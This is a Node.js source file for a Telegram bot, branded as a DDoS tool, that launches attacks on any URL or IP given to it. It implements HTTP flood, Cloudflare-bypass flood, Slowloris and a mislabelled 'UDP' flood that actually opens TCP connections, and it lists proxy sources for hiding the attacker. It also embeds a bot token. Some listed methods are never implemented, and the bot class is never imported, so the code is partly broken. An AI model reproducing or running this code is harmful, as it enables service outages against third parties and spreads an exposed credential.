const moment = require('moment');
const axios = require('axios');
const net = require('net');
const tls = require('tls');
const http = require('http');
const https = require('https');
const socks = require('socks');
const { SocksProxyAgent } = require('socks-proxy-agent');
const cloudscraper = require('cloudscraper');
const cheerio = require('cheerio');
const puppeteer = require('puppeteer');
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, {polling: true});
const userAgents = [
    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
];
const proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
];
const methods = ["GET", "POST", "HEAD"];
const activeAttacks = {};
function getCurrentDateTime() {
    const now = new Date();
    const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
    const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Augustus', 'September', 'Oktober', 'November', 'Desember'];
    const dayName = days[now.getDay()];
    const date = now.getDate();
    const monthName = months[now.getMonth()];
    const year = now.getFullYear();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    
    return `${dayName}, ${date} ${monthName} ${year} ${hours}:${minutes}:${seconds}`;
}
function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}
function getRandomMethod() {
    return methods[Math.floor(Math.random() * methods.length)];
}
function parseTarget(url) {
    try {
        const parsed = new URL(url);
        return {
            uri: parsed.pathname || '/',
            host: parsed.hostname,
            scheme: parsed.protocol.replace(':', ''),
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80)
        };
    } catch (e) {
        return null;
    }
}
function spoofer() {
    const addr = [
        Math.floor(Math.random() * 186) + 11,
        Math.floor(Math.random() * 255),
        Math.floor(Math.random() * 255),
        Math.floor(Math.random() * 252) + 2
    ];
    return addr.join('.');
}
async function attackCFB(url, duration, chatId) {
    const endTime = Date.now() + duration * 1000;
    const scraper = cloudscraper.defaults({ 
        cloudflareTimeout: 5000,
        cloudflareMaxTimeout: 30000
    });
    activeAttacks[chatId] = true;
    while (Date.now() < endTime && activeAttacks[chatId]) {
        try {
            await Promise.all([
                scraper.get(url),
                scraper.post(url),
                scraper.head(url)
            ]);
        } catch (e) {
        }
    }
    delete activeAttacks[chatId];
}
async function attackHTTP(url, duration, chatId, method = 'GET') {
    const endTime = Date.now() + duration * 1000;
    activeAttacks[chatId] = true;
    while (Date.now() < endTime && activeAttacks[chatId]) {
        try {
            const options = {
                method,
                headers: {
                    'User-Agent': getRandomUserAgent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cache-Control': 'no-cache'
                }
            };
            await axios(url, options);
        } catch (e) {
        }
    }
    delete activeAttacks[chatId];
}
async function attackSlowloris(url, duration, chatId) {
    const target = parseTarget(url);
    if (!target) return;
    const endTime = Date.now() + duration * 1000;
    activeAttacks[chatId] = true;
    while (Date.now() < endTime && activeAttacks[chatId]) {
        try {
            const socket = target.scheme === 'https' ? 
                tls.connect(target.port, target.host, { servername: target.host }) :
                net.connect(target.port, target.host);
            socket.setTimeout(0);
            socket.on('error', () => socket.destroy());
            const headers = [
                `GET /?${Math.random()} HTTP/1.1`,
                `Host: ${target.host}`,
                `User-Agent: ${getRandomUserAgent()}`,
                `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9`,
                `Accept-Language: en-US,en;q=0.9`,
                `Connection: keep-alive`,
                `\r\n`
            ].join('\r\n');
            
            socket.write(headers);
            const keepAlive = setInterval(() => {
                if (!activeAttacks[chatId] || Date.now() >= endTime) {
                    clearInterval(keepAlive);
                    socket.destroy();
                    return;
                }
                try {
                    socket.write(`X-a: ${Math.random()}\r\n`);
                } catch (e) {
                    clearInterval(keepAlive);
                    socket.destroy();
                }
            }, 15000);
            
        } catch (e) {
        }
    }
    delete activeAttacks[chatId];
}
async function attackUDP(target, port, duration, chatId) {
    const endTime = Date.now() + duration * 1000;
    activeAttacks[chatId] = true;
    while (Date.now() < endTime && activeAttacks[chatId]) {
        try {
            const socket = net.createConnection(port, target);
            const data = Buffer.alloc(1024, 'X');
            
            socket.on('connect', () => {
                for (let i = 0; i < 100; i++) {
                    socket.write(data);
                }
                socket.destroy();
            });
            socket.on('error', () => socket.destroy());
        } catch (e) {
        }
    }
    delete activeAttacks[chatId];
}
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const message = `🔰 *EXECUTOR HACKED LORDHOZOO* 🔰\n\n` +
        `📅 *Tanggal*: ${getCurrentDateTime()}\n\n` +
        `💻 *Commands*:\n` +
        `/layer7 - Show Layer7 methods\n` +
        `/layer4 - Show Layer4 methods\n` +
        `/tools - Show tools\n` +
        `/help - Show all commands\n` +
        `/stop - Stop all attacks\n\n` +
        `📌 *Tutorial*: [YouTube](https://youtube.com/@hozoo999?si=jBgscH4e_ebWEsZY)\n` +
        `📌 *Donasi*: [Donate](http//hozoo.go.id)\n` +
        `📌 *TikTok*: [TikTok](https://tiktok.com)\n` +
        `📌 *Tutor*: [Tutor](https://hozoo.25272826226262662.server.net.com.php)`;
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const message = `📚 *EXECUTOR LORDHOZOO TOOLS DDOS*:\n\n` +
        `⚡ *Attack Methods*:\n` +
        `/cfb [url] [time] [threads] - Bypass CF attack\n` +
        `/http [url] [time] [threads] - HTTP flood\n` +
        `/slowloris [url] [time] [threads] - Slowloris attack\n` +
        `/udp [ip] [port] [time] [threads] - UDP flood\n\n` +
        `🔧 *Tools*:\n` +
        `/dns [domain] - DNS lookup\n` +
        `/geoip [ip] - GeoIP lookup\n` +
        `/subnet [ip] - Subnet calculator\n\n` +
        `🛑 *Other*:\n` +
        `/stop - Stop all attacks\n` +
        `/help - Show this help\n\n` +
        `📅 *Tanggal*: ${getCurrentDateTime()}`;
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});
bot.onText(/\/layer7/, (msg) => {
    const chatId = msg.chat.id;
    const message = `🔥 *Layer7 Methods*:\n\n` +
        `• cfb - Bypass CF attack\n` +
        `• http - HTTP flood\n` +
        `• slowloris - Slowloris attack\n` +
        `• spoof - Spoof X-forward attack\n` +
        `• stellar - HTTPS Sky method\n\n` +
        `📅 *Tanggal*: ${getCurrentDateTime()}\n` +
        `Usage: /method [url] [time] [threads]`;
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});
bot.onText(/\/layer4/, (msg) => {
    const chatId = msg.chat.id;
    const message = `⚡ *Layer4 Methods*:\n\n` +
        `• udp - UDP flood\n` +
        `• tcp - TCP flood\n` +
        `• mine - Minecraft DOS\n` +
        `• vse - Valve Source Engine\n\n` +
        `📅 *Tanggal*: ${getCurrentDateTime()}\n` +
        `Usage: /method [ip] [port] [time] [threads]`;
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});
bot.onText(/\/tools/, (msg) => {
    const chatId = msg.chat.id;
    const message = `🛠️ *Available Tools*:\n\n` +
        `• dns - DNS lookup\n` +
        `• geoip - GeoIP lookup\n` +
        `• subnet - Subnet calculator\n\n` +
        `📅 *Tanggal*: ${getCurrentDateTime()}\n` +
        `Usage: /tool [target]`;
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});
bot.onText(/\/cfb (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');
    
    if (params.length < 2) {
        return bot.sendMessage(chatId, 'Usage: /cfb [url] [time] [threads=1]');
    }
    
    const url = params[0];
    const time = parseInt(params[1]);
    const threads = params[2] ? parseInt(params[2]) : 1;
    
    if (!url || !time || isNaN(time) || isNaN(threads)) {
        return bot.sendMessage(chatId, 'Invalid parameters');
    }
    
    bot.sendMessage(chatId, `🚀 Starting CFB attack on ${url} for ${time} seconds with ${threads} threads...`);
    
    for (let i = 0; i < threads; i++) {
        attackCFB(url, time, chatId);
    }
    
    // Countdown
    let remaining = time;
    const countdown = setInterval(() => {
        remaining--;
        if (remaining <= 0 || !activeAttacks[chatId]) {
            clearInterval(countdown);
            bot.sendMessage(chatId, `✅ Attack on ${url} finished!`);
        }
    }, 1000);
});
bot.onText(/\/http (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');
    
    if (params.length < 2) {
        return bot.sendMessage(chatId, 'Usage: /http [url] [time] [threads=1] [method=GET]');
    }
    const url = params[0];
    const time = parseInt(params[1]);
    const threads = params[2] ? parseInt(params[2]) : 1;
    const method = params[3] || 'GET';
    if (!url || !time || isNaN(time) || isNaN(threads)) {
        return bot.sendMessage(chatId, 'Invalid parameters');
    }
    bot.sendMessage(chatId, `🚀 Starting HTTP ${method} attack on ${url} for ${time} seconds with ${threads} threads...`);
    for (let i = 0; i < threads; i++) {
        attackHTTP(url, time, chatId, method);
    }
    let remaining = time;
    const countdown = setInterval(() => {
        remaining--;
        if (remaining <= 0 || !activeAttacks[chatId]) {
            clearInterval(countdown);
            bot.sendMessage(chatId, `✅ Attack on ${url} finished!`);
        }
    }, 1000);
});
bot.onText(/\/slowloris (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');
    if (params.length < 2) {
        return bot.sendMessage(chatId, 'Usage: /slowloris [url] [time] [threads=1]');
    }
    const url = params[0];
    const time = parseInt(params[1]);
    const threads = params[2] ? parseInt(params[2]) : 1;
    if (!url || !time || isNaN(time) || isNaN(threads)) {
        return bot.sendMessage(chatId, 'Invalid parameters');
    }
    bot.sendMessage(chatId, `🚀 Starting Slowloris attack on ${url} for ${time} seconds with ${threads} threads...`);
    for (let i = 0; i < threads; i++) {
        attackSlowloris(url, time, chatId);
    }
    let remaining = time;
    const countdown = setInterval(() => {
        remaining--;
        if (remaining <= 0 || !activeAttacks[chatId]) {
            clearInterval(countdown);
            bot.sendMessage(chatId, `✅ Attack on ${url} finished!`);
        }
    }, 1000);
});
bot.onText(/\/udp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1].split(' ');
    
    if (params.length < 3) {
        return bot.sendMessage(chatId, 'Usage: /udp [ip] [port] [time] [threads=1]');
    }
    
    const ip = params[0];
    const port = parseInt(params[1]);
    const time = parseInt(params[2]);
    const threads = params[3] ? parseInt(params[3]) : 1;
    
    if (!ip || !port || !time || isNaN(port) || isNaN(time) || isNaN(threads)) {
        return bot.sendMessage(chatId, 'Invalid parameters');
    }
    
    bot.sendMessage(chatId, `🚀 Starting UDP attack on ${ip}:${port} for ${time} seconds with ${threads} threads...`);
    
    for (let i = 0; i < threads; i++) {
        attackUDP(ip, port, time, chatId);
    }
    
    // Countdown
    let remaining = time;
    const countdown = setInterval(() => {
        remaining--;
        if (remaining <= 0 || !activeAttacks[chatId]) {
            clearInterval(countdown);
            bot.sendMessage(chatId, `✅ Attack on ${ip}:${port} finished!`);
        }
    }, 1000);
});

bot.onText(/\/dns (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const domain = match[1];
    try {
        const response = await axios.get(`https://api.hackertarget.com/reversedns/?q=${domain}`);
        bot.sendMessage(chatId, `🔍 DNS Lookup for ${domain}:\n\n${response.data}`, { parse_mode: 'Markdown' });
    } catch (e) {
        bot.sendMessage(chatId, '❌ Error performing DNS lookup');
    }
});
bot.onText(/\/geoip (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1];
    try {
        const response = await axios.get(`https://api.hackertarget.com/geoip/?q=${ip}`);
        bot.sendMessage(chatId, `🌍 GeoIP Lookup for ${ip}:\n\n${response.data}`, { parse_mode: 'Markdown' });
    } catch (e) {
        bot.sendMessage(chatId, '❌ Error performing GeoIP lookup');
    }
});
bot.onText(/\/subnet (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1];
    try {
        const response = await axios.get(`https://api.hackertarget.com/subnetcalc/?q=${ip}`);
        bot.sendMessage(chatId, `🔢 Subnet Calculator for ${ip}:\n\n${response.data}`, { parse_mode: 'Markdown' });
    } catch (e) {
        bot.sendMessage(chatId, '❌ Error performing subnet calculation');
    }
});
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    if (activeAttacks[chatId]) {
        activeAttacks[chatId] = false;
        bot.sendMessage(chatId, '🛑 All attacks stopped!');
    } else {
        bot.sendMessage(chatId, '⚠️ No active attacks to stop');
    }
});
console.log('Bot is running...');
